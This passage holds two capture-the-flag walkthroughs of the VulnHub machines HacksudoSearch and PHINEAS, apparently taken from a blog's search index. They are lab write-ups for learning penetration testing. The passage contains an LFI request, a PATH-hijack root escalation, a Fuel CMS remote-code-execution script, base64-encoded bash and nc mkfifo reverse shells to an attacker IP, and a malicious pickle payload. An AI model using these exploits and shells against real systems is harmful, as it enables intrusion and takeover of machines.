21:a1:86:47:07:1b:df:b2:70:7e:d9:30:e3:29:c2:e7 (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-server-header: Apache/2.4.38 (Debian)|_http-title: HacksudoSearchMAC Address: 08:00:27:2F:78:D3 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.04 secondsReally nothing much to work on. But let’s enumerate common ports more.HTTP- TCP 80Nikto show that they found a .env file.└─# nikto -ask=no -h 192.168.56.8:80 2&amp;gt;&amp;amp;1 | tee nikto_P80.txt- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.56.8+ Target Hostname: 192.168.56.8+ Target Port: 80+ Start Time: 2021-05-16 02:14:02 (GMT-4)---------------------------------------------------------------------------+ Server: Apache/2.4.38 (Debian)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is &quot;127.0.0.1&quot;.+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.+ OSVDB-3268: /account/: Directory indexing found.+ OSVDB-3092: /account/: This might be interesting...+ OSVDB-3233: /icons/README: Apache default file found.+ /.env: .env file found. The .env file may contain credentials.+ 7915 requests: 0 error(s) and 9 item(s) reported on remote host+ End Time: 2021-05-16 02:14:52 (GMT-4) (50 seconds)---------------------------------------------------------------------------+ 1 host(s) tested.env File contents:APP_name=HackSudoSearchAPP_ENV=localAPP_key=base64:aGFja3N1ZG8gaGVscCB5b3UgdG8gbGVhcm4gQ1RGICwgY29udGFjdCB1cyB3d3cuaGFja3N1ZG8uY29tL2NvbnRhY3QKAPP_DEBUG=falseAPP_URL=http://localhostLOG_CHANNEL=stackDB_CONNECTION=mysqlDB_HOST=127.0.0.1DB_PORT=3306DB_USERNAME=hiramanDB_PASSWORD=MyD4dSuperH3r0!We found a user and password MyD4dSuperH3r0!. Trying to SSH with the credential above fails.Further enumeration shows a interesting file called search1.php└─# gobuster dir -u http://192.168.56.8:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -e -k -s 200,204,301,302,307,403,500 -x txt,html,php,php.bak,bak,jsp -o gobuster_p80.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.56.8:80 [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: txt,html,php,php.bak,bak,jsp [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/05/16 02:30:44 Starting gobuster in directory enumeration mode =============================================================== http://192.168.56.8:80/submit.php (Status: 200) [Size: 165] http://192.168.56.8:80/assets (Status: 301) [Size: 313] [--&amp;gt; http://192.168.56.8/assets/] http://192.168.56.8:80/account (Status: 301) [Size: 314] [--&amp;gt; http://192.168.56.8/account/] http://192.168.56.8:80/search.php (Status: 200) [Size: 165] http://192.168.56.8:80/images (Status: 301) [Size: 313] [--&amp;gt; http://192.168.56.8/images/] http://192.168.56.8:80/index.php (Status: 200) [Size: 715] http://192.168.56.8:80/javascript (Status: 301) [Size: 317] [--&amp;gt; http://192.168.56.8/javascript/] http://192.168.56.8:80/robots.txt (Status: 200) [Size: 75] http://192.168.56.8:80/LICENSE (Status: 200) [Size: 1074] http://192.168.56.8:80/search1.php (Status: 200) [Size: 2918] http://192.168.56.8:80/server-status (Status: 403) [Size: 277] http://192.168.56.8:80/crawler.php (Status: 500) [Size: 0] Looking through the source code:&amp;lt;title&amp;gt; Hacksudo::search &amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body style=&quot;background-color:Navy;&quot;&amp;gt; &amp;lt;!-- find me @hacksudo.com/contact @fuzzing always best option :) --&amp;gt; &amp;lt;font color=white&amp;gt; &amp;lt;div class=&quot;topnav&quot;&amp;gt; &amp;lt;a class=&quot;active&quot; href=&quot;?find=home.php&quot;&amp;gt;Home&amp;lt;/a&amp;gt; &amp;lt;a href=&quot;?Me=about.php&quot;&amp;gt;About&amp;lt;/a&amp;gt; &amp;lt;a href=&quot;?FUZZ=contact.php&quot;&amp;gt;Contact&amp;lt;/a&amp;gt; &amp;lt;div class=&quot;search-container&quot;&amp;gt; &amp;lt;form action=&quot;submit.php&quot;&amp;gt; &amp;lt;input type=&quot;text&quot; placeholder=&quot;Search..&quot; name=&quot;search&quot;&amp;gt; &amp;lt;button type=&quot;submit&quot;&amp;gt;&amp;lt;i class=&quot;fa fa-search&quot;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;Hint to Fuzz:Looks like there is a hint to do some fuzzing.Shell as HacksudoFuzzing with fuzzer:└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.56.8/search1.php?FUZZ=contact.php -fs 2918 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.0 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.56.8/search1.php?FUZZ=contact.php :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 2918________________________________________________me [Status: 200, Size: 2203, Words: 285, Lines: 114]:: Progress: [87664/87664] :: Job [1/1] :: 795 req/sec :: Duration: [0:01:42] :: Errors: 0 ::Great, so we know we can use me , we can try to see if LFI is possible : http://192.168.56.8/search1.php?me=../../../etc/passwdcurl──(root💀kali)-[/opt/Vulnhub/hacksudosearch]└─# curl http://192.168.56.8/search1.php?me=../../../etc/passwd &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; ......root:x:0:0:root:/root:/bin/bash......hacksudo:x:1000:1000:hacksudo,,,:/home/hacksudo:/bin/bashmonali:x:1001:1001:,,,:/home/monali:/bin/bashjohn:x:1002:1002:,,,:/home/john:/bin/bashsearch:x:1003:1003:,,,:/home/search:/bin/bash &amp;lt;/form&amp;gt;&amp;lt;/font&amp;gt;Great now we have a few usernames to try the password we initially found. Which is hacksud,monali,john &amp;amp; search.┌──(root💀kali)-[/opt/Vulnhub]└─# ssh hacksudo@192.168.56.8 hacksudo@192.168.56.8&#39;s password: Linux HacksudoSearch 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Thu Apr 15 14:10:28 2021 from 192.168.43.217hacksudo@HacksudoSearch:~$ whoami &amp;amp;&amp;amp; id &amp;amp;&amp;amp; hostnamehacksudouid=1000(hacksudo) gid=1000(hacksudo) groups=1000(hacksudo),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)HacksudoSearchhacksudo@HacksudoSearch:~$ cat user.txtd045e6f9feb79e94442213f9d008ac48 Great! Shell as HacksudoSearch!Shell as Root hacksudo@HacksudoSearch:/tmp$ python suid3num.py ___ _ _ _ ___ _____ _ _ _ __ __ / __| | | / | \\ |__ / \\| | | | | \\/ | \\__ \\ |_| | | |) | |_ \\ .` | |_| | |\\/| | |___/\\___/|_|___/ |___/_|\\_|\\___/|_| |_| twitter@syed__umar [#] Finding/Listing all SUID Binaries .. ------------------------------ /usr/bin/passwd /usr/bin/gpasswd /usr/bin/pkexec /usr/bin/chfn /usr/bin/umount /usr/bin/mount /usr/bin/newgrp /usr/bin/chsh /usr/bin/su /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/dbus-1.0/dbus-daemon-launch-helper /home/hacksudo/search/tools/searchinstall ------------------------------ [!] Default Binaries (Don&#39;t bother) ------------------------------ /usr/bin/passwd /usr/bin/gpasswd /usr/bin/pkexec /usr/bin/chfn /usr/bin/umount /usr/bin/mount /usr/bin/newgrp /usr/bin/chsh /usr/bin/su /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/dbus-1.0/dbus-daemon-launch-helper------------------------------ [~] Custom SUID Binaries (Interesting Stuff)------------------------------/home/hacksudo/search/tools/searchinstall------------------------------[#] SUID Binaries found in GTFO bins..------------------------------[!] None :(------------------------------[-] Note------------------------------If you see any FP in the output, please report it to make the script better! :)------------------------------Let’s try running searchinstall, since it was highlighted.hacksudo@HacksudoSearch:/tmp$ /home/hacksudo/search/tools/searchinstallinstall: missing file operandNothing special, but looking at the file folder we can see that the program is running as root and we are able to see the source code.hacksudo@HacksudoSearch:~/search/tools$ ls -latotal 32drwxr-xr-x 2 hacksudo hacksudo 4096 Apr 15 02:57 .drwxr-xr-x 4 hacksudo hacksudo 4096 Apr 14 03:50 ..-rw-r--r-- 1 hacksudo hacksudo 0 Apr 15 02:57 file---Sr-xr-x 1 root root 16712 Apr 14 03:36 searchinstall-rw-r--r-- 1 hacksudo hacksudo 78 Apr 14 03:34 searchinstall.chacksudo@HacksudoSearch:~/search/tools$ cat searchinstall.c#include&amp;lt;unistd.h&amp;gt;void main(){ setuid(0); setgid(0); system(&quot;install&quot;);}From the source code of searchinstall.c we can deduce that we can use a path-variable exploit by making the program run install which we created which contains our command instead.hacksudo@HacksudoSearch:~/search/tools$ echo $PATH/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/gameshacksudo@HacksudoSearch:~/search/tools$ echo &#39;/bin/bash&#39; &amp;gt; installhacksudo@HacksudoSearch:~/search/tools$ chmod 777 install hacksudo@HacksudoSearch:~/search/tools$ export PATH=./:$PATHhacksudo@HacksudoSearch:~/search/tools$ echo $PATH./:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/gameshacksudo@HacksudoSearch:~/search/tools$ ./searchinstall root@HacksudoSearch:~/search/tools# whoami &amp;amp;&amp;amp; idrootuid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(hacksudo)root@HacksudoSearch:~/search/tools# cd /rootroot@HacksudoSearch:/root# cat .bashrc .config/ .local/ notes.txt .profile .wget-hsts .cache/ .gnupg/ .mysql_history .npm/ root.txt root@HacksudoSearch:/root# cat root.txt _ _ _ ____ _ | |__ __ _ ___| | _____ _ _ __| | ___ / ___| ___ __ _ _ __ ___| |__ | &#39;_ \\ / _` |/ __| |/ / __| | | |/ _` |/ _ \\ \\___ \\ / _ \\/ _` | &#39;__/ __| &#39;_ \\ | | | | (_| | (__| &amp;lt;\\__ \\ |_| | (_| | (_) | ___) | __/ (_| | | | (__| | | ||_| |_|\\__,_|\\___|_|\\_\\___/\\__,_|\\__,_|\\___/ |____/ \\___|\\__,_|_| \\___|_| |_|You Successfully Hackudo search box rooted!!!flag={9fb4c0afce26929041427c935c6e0879}Rooted!" }, { "title": "PHINEAS: 1", "url": "/posts/PHINEAS_1/", "categories": "Vulnhub, medium", "tags": "Python pickles", "date": "2021-05-01 20:00:00 +0800", "snippet": "OverviewGreat box to practice enumeration, modifying public exploit to suit our needs and exploiting Python pickles. Box Difficulty Link Easy-Medium Vulnhub Link For this box I downloaded it off vulnhub and run it on my network.ReconLet’s start begin with our standard pre-enumeration process to find out all the open ports.This time let’s use nmap to find all open ports└─# nmap -p- 192.168.1.29 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-27 04:51 EDTNmap scan report for phineas (192.168.1.29)Host is up (0.00044s latency).Not shown: 65531 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http111/tcp open rpcbind3306/tcp open mysqlMAC Address: 08:00:27:E3:69:7E (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 3.14 seconds Now that we found that there are 4 open ports, let’s do a nmap to find more information about the service running.└─# nmap -sV -sC -p 22,80,111,3306 192.168.1.29 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-27 04:53 EDTNmap scan report for phineas (192.168.1.29)Host is up (0.00035s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey: | 2048 ac:d8:0a:a8:6a:1f:78:6d:ac:06:8f:65:3e:ff:9c:8b (RSA)| 256 e7:f8:b0:07:1c:5b:4a:48:10:bc:f6:36:42:62:6c:e0 (ECDSA)|_ 256 c8:f0:ea:b8:bf:6b:a5:12:1f:9a:91:62:9d:1a:ce:75 (ED25519)80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16|_http-title: Apache HTTP Server Test Page powered by CentOS111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind|_ 100000 3,4 111/udp6 rpcbind3306/tcp open mysql MariaDB (unauthorized)MAC Address: 08:00:27:E3:69:7E (Oracle VirtualBox virtual NIC)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.05 secondsReally nothing much to work on. But let’s enumerate common ports more.Mysql - TCP 3306Nothing much on port 3306 based on nmap scans.└─# nmap -sV -p 3306 --script=&quot;banner,(mysql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)&quot; 192.168.1.29 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-27 04:59 EDT Nmap scan report for phineas (192.168.1.29) Host is up (0.00059s latency). PORT STATE SERVICE VERSION 3306/tcp open mysql MariaDB (unauthorized) | banner: ?\\x00\\x00\\x00\\xFFj\\x04Host &#39;kali&#39; is not allowed to connect to |_this MariaDB server|_mysql-empty-password: Host &#39;kali&#39; is not allowed to connect to this MariaDB server|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)|_sslv2-drown: MAC Address: 08:00:27:E3:69:7E (Oracle VirtualBox virtual NIC)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 0.75 secondsHTTP- TCP 80Running nikto doesn’t gives much information just that we know its running php and apache as it backend.└─# nikto -ask=no -h 192.168.1.29:80 2&amp;gt;&amp;amp;1- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.1.29+ Target Hostname: 192.168.1.29+ Target Port: 80+ Start Time: 2021-04-27 05:01:25 (GMT-4)---------------------------------------------------------------------------+ Server: Apache/2.4.6 (CentOS) PHP/5.4.16+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ PHP/5.4.16 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST+ OSVDB-3268: /icons/: Directory indexing found.+ OSVDB-3233: /icons/README: Apache default file found.+ 8724 requests: 0 error(s) and 9 item(s) reported on remote host+ End Time: 2021-04-27 05:02:29 (GMT-4) (64 seconds)---------------------------------------------------------------------------+ 1 host(s) testedThankful gobuster file enumeration shows that there is a “structure” folder found.└─# gobuster dir -u http://192.168.1.29 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -e -k -s &quot;200,204,301,302,307,403,500&quot; -x &quot;txt,html,php,jsp&quot; ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.1.29[+] Method: GET[+] Threads: 100[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: txt,html,php,jsp[+] Expanded: true[+] Timeout: 10s===============================================================2021/04/30 13:26:59 Starting gobuster in directory enumeration mode===============================================================http://192.168.1.29/structure (Status: 301) [Size: 238] [--&amp;gt; http://192.168.1.29/structure/]Further enumeration of the “structure” folder reveals that there is a Fuel CMS running on the backend.└─# gobuster dir -u http://192.168.1.29/structure/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -e -k -s &quot;200,204,301,302,307,403,500&quot; -x &quot;txt,html,php,jsp&quot; ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.1.29/structure/[+] Method: GET[+] Threads: 100[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: jsp,txt,html,php[+] Expanded: true[+] Timeout: 10s===============================================================2021/04/27 13:30:17 Starting gobuster in directory enumeration mode===============================================================http://192.168.1.29/structure/assets (Status: 301) [Size: 245] [--&amp;gt; http://192.168.1.29/structure/assets/]http://192.168.1.29/structure/robots.txt (Status: 200) [Size: 30] http://192.168.1.29/structure/index.php (Status: 200) [Size: 9288] http://192.168.1.29/structure/fuel (Status: 301) [Size: 243] [--&amp;gt; http://192.168.1.29/structure/fuel/]Shell as ApacheSearchsploit shows that there is a exploit available:└─# searchsploit fuel cms ---------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------fuel CMS 1.4.1 - Remote Code Execution (1) | linux/webapps/47138.pyFuel CMS 1.4.1 - Remote Code Execution (2) | php/webapps/49487.rbFuel CMS 1.4.7 - &#39;col&#39; SQL Injection (Authenticated) | php/webapps/48741.txtFuel CMS 1.4.8 - &#39;fuel_replace_id&#39; SQL Injection (Authenticated) | php/webapps/48778.txt---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsAfter downloading the exploit, modify the exploit file to suit our need.import requestsimport urlliburl = &quot; http://192.168.1.29/structure/&quot;def find_nth_overlapping(haystack, needle, n): start = haystack.find(needle) while start &amp;gt;= 0 and n &amp;gt; 1: start = haystack.find(needle, start+1) n -= 1 return startwhile 1: xxxx = raw_input(&#39;cmd:&#39;) burp0_url = url+&quot;/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27&quot;+urllib.quote(xxxx)+&quot;%27%29%2&amp;gt; #proxy = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;} r = requests.get(burp0_url) html = &quot;&amp;lt;!DOCTYPE html&amp;gt;&quot; htmlcharset = r.text.find(html) begin = r.text[0:20] dup = find_nth_overlapping(r.text,begin,2) print r.text[0:dup]Run the exploit and command to see who we are and what we can do!└─# python 47138.py /usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release. cmd:id systemuid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0 cmd:which awk perl python python3 ruby gcc cc vi vim nmap find netcat nc wget tftp ftp php 2&amp;gt;/dev/null system/usr/bin/awk /usr/bin/perl /usr/bin/python /usr/bin/python3 /usr/bin/ruby/usr/bin/vi/usr/bin/vim/usr/bin/find/usr/bin/nc/usr/bin/wget/usr/bin/php Something i like to do is base64 encode and decode then pipe to bash for reverse shell:bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.152/4444 0&amp;gt;&amp;amp;1 # Base64 encode this echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTUyLzQ0NDQgMD4mMQ== | base64 -d | bashRunning the exploit:└─$ python 47138.pycmd:echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTUyLzQ0NDQgMD4mMQ== | base64 -d | bashOn our attacking machine :└─# nc -lvnp 4444 listening on [any] 4444 ...connect to [192.168.1.152] from (UNKNOWN) [192.168.1.29] 58334bash: no job control in this shellbash-4.2$ whoamiwhoamiapachebash-4.2$ hostname &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; idhostname &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; idphineasapacheuid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0bash-4.2$ Great! Shell as apache!Shell as annaWhenever there is a web CMS installed, sometimes it’s best to look through the configuration file for password reuse attacks.bash-4.2$ pwd pwd /var/www/html/structure/fuel/application/config bash-4.2$ ls -la ........ -rwxr-xr-x. 1 apache apache 4647 Apr 1 04:22 database.php ........ bash-4.2$ cat database.php........$db[&#39;default&#39;] = array( &#39;dsn&#39; =&amp;gt; &#39;&#39;, &#39;hostname&#39; =&amp;gt; &#39;localhost&#39;, &#39;username&#39; =&amp;gt; &#39;anna&#39;, &#39;password&#39; =&amp;gt; &#39;H993hfkNNid5kk&#39;, &#39;database&#39; =&amp;gt; &#39;anna&#39;,.......Having a username and password, let us SSH into the machine as anna.└─$ ssh anna@192.168.1.29anna@192.168.1.29&#39;s password: [anna@phineas ~]$ whoami &amp;amp;&amp;amp; id &amp;amp;&amp;amp; hostnameannauid=1001(anna) gid=1001(anna) groups=1001(anna) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023Phineas[anna@phineas ~]$ cd Desktop/[anna@phineas Desktop]$ ls -latotal 8drwx------. 2 anna anna 22 Mar 31 05:34 .drwx------. 19 anna anna 4096 Apr 27 12:52 ..-rwx------. 1 anna anna 35 Mar 31 05:21 user.txt[anna@phineas Desktop]$ cat user.txt c2Vpc2VtcHJlbmVsbWlvY3VvcmVtYW1tYQAnd we are anna!Shell as RootAfter running linpeas we can see that there are 2 ports running locally on port 631 and 5000.[+] Iptables rulesiptables rules Not Found[+] Active Ports[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-portstcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:5000 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN - tcp6 0 0 :::111 :::* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 ::1:631 :::* LISTEN - Also running pspy64:[anna@phineas 192.168.1.152]$ ./pspy64 -pf -i 1000 pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855 ██▓███ ██████ ██▓███ ▓██ ██▓ ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒ ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░ ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░ ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░ ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒ ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░ ░░ ░ ░ ░ ░░ ▒ ▒ ░░ ░ ░ ░ ░ ░ Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive) Draining file system events due to startup... done 2021/04/30 12:54:19 CMD: UID=0 PID=998 | /usr/sbin/httpd -DFOREGROUND 2021/04/30 12:54:19 CMD: UID=0 PID=990 | /usr/bin/python3 /usr/local/bin/flask run 2021/04/30 12:54:19 CMD: UID=0 PID=989 | /usr/sbin/rsyslogd -n 2021/04/30 12:54:19 CMD: UID=0 PID=985 | /usr/sbin/sshd -D 2021/04/30 12:54:19 CMD: UID=0 PID=984 | /bin/bash /root/run_flask.sh We can see that there is a flask service running on the system. This is highly suspicious since in anna home folder, after further enumeration we can find the below.[anna@phineas web]$ cat app.py#!/usr/bin/python3import pickleimport base64from flask import Flask, requestapp = Flask(__name__)@app.route(&quot;/heaven&quot;, methods=[&quot;POST&quot;])def heaven(): data = base64.urlsafe_b64decode(request.form[&#39;awesome&#39;]) pickle.loads(data) return &#39;&#39;, 204The scripts shows that at /heaven, there is a POST route that takes form data awesome. The data comes encoded in base64 (for transfer), is decoded and then unpickled.Combining this together, we can deduce that the server is hosting a python flask on port 5000 and we are to exploit python pickle to escalate to root.How do we know if pickle not secure?Based on its documentation page: WarningThe pickle module is not secure. Only unpickle data you trust.It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.Thus, to execute the exploit we cannot simply send a request within the phineas system, we have to create a local port forwarding so we are able to send a request from our system to phineas to port 5000.First, we set a ssh local port forwardingSyntax :e.g. ssh remotehost -L 123:localhost:456123 — port 123 on our machine to receive the forwarded port from the remote hostlocalhost — The forward to host. In this particular case it’s the victim machine456 — port 456 on the target machine (victim) to be forwarded to the remote hostremotehost — system we want to SSH into and forward ports from.If server is running a website on port 8080 but you can only access it internally from the target’s network. Using an arbitrary port like 9000 on our Kali system we can use this to access the website.The command to do this would be: ssh -L 9000:localhost:8080 victimOnce the tunnel has been established you can access this new website via http://localhost:9000└─# ssh anna@192.168.1.29 -L 5000:localhost:5000 anna@192.168.1.29&#39;s password: Last login: Fri Apr 30 13:03:53 2021 from kali[anna@phineas ~]$ Once the tunnel has been established we can access this new website at http://localhost:5000Now to create the exploit┌──(root💀kali)-[/opt/HTB/Phineas]└─# cat exp.py import pickleimport base64import osclass RCE: def __reduce__(self): cmd = (&#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | &#39; &#39;/bin/sh -i 2&amp;gt;&amp;amp;1 | nc 192.168.1.152 1234 &amp;gt; /tmp/f&#39;) return os.system, (cmd,)if __name__ == &#39;__main__&#39;: pickled = pickle.dumps(RCE()) print(base64.urlsafe_b64encode(pickled)) ┌──(root💀kali)-[/opt/HTB/Phineas]└─# python3 exp.py b&#39;gASVcgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFdybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI-JjEgfCBuYyAxOTIuMTY4LjEuMTUyIDEyMzQgPiAvdG1wL2aUhZRSlC4=&#39;Sending the payload:┌──(root💀kali)-[/opt]└─# curl -X &quot;POST&quot; -d &quot;b&#39;gASVcgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFdybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI-JjEgfCBuYyAxOTIuMTY4LjEuMTUyIDEyMzQgPiAvdG1wL2aUhZRSlC4=&#39;&quot; http://127.0.0.1:5000/heaven Catching the shell:└─# nc -lvnp 1234 listening on [any] 1234 ... connect to [192.168.1.152] from (UNKNOWN) [192.168.1.29] 42030 sh: no job control in this shell sh-4.2# whoami whoami root sh-4.2# pwd pwd /home/anna/websh-4.2# cd /rootcd /rootsh-4.2# ls -lals -latotal 40drw-------. 7 root root 265 Apr 1 05:17 .dr-xr-xr-x. 17 root root 224 Nov 23 12:26 ..-rw-------. 1 root root 1920 Nov 23 12:27 anaconda-ks.cfg-rw-------. 1 root root 107 Apr 1 13:56 .bash_history-rw-r--r--. 1 root root 18 Dec 28 2013 .bash_logout-rw-r--r--. 1 root root 176 Dec 28 2013 .bash_profile-rw-r--r--. 1 root root 176 Dec 28 2013 .bashrcdrwx------. 5 root root 42 Mar 31 04:01 .cachedrwx------. 4 root root 30 Mar 31 03:52 .config-rw-r--r--. 1 root root 100 Dec 28 2013 .cshrcdrwx------. 3 root root 25 Nov 23 12:28 .dbusdrwxr-xr-x. 4 root root 31 Apr 1 05:17 .gem-rw-------. 1 root root 1948 Nov 23 12:29 initial-setup-ks.cfgdrwxr-----. 3 root root 19 Mar 31 03:58 .pki-rw-------. 1 root root 32 Mar 31 05:22 root.txt-rwx--x--x. 1 root root 43 Mar 31 05:26 run_flask.sh-rw-r--r--. 1 root root 129 Dec 28 2013 .tcshrcsh-4.2# cat root.txtcat root.txtYW5uYW1hcmlhbmljb3NhbnRpdml2ZSEsh-4.2# whoami &amp;amp;&amp;amp; id &amp;amp;&amp;amp; hostnamewhoami &amp;amp;&amp;amp; id &amp;amp;&amp;amp; hostnamerootuid=0(root) gid=0(root) 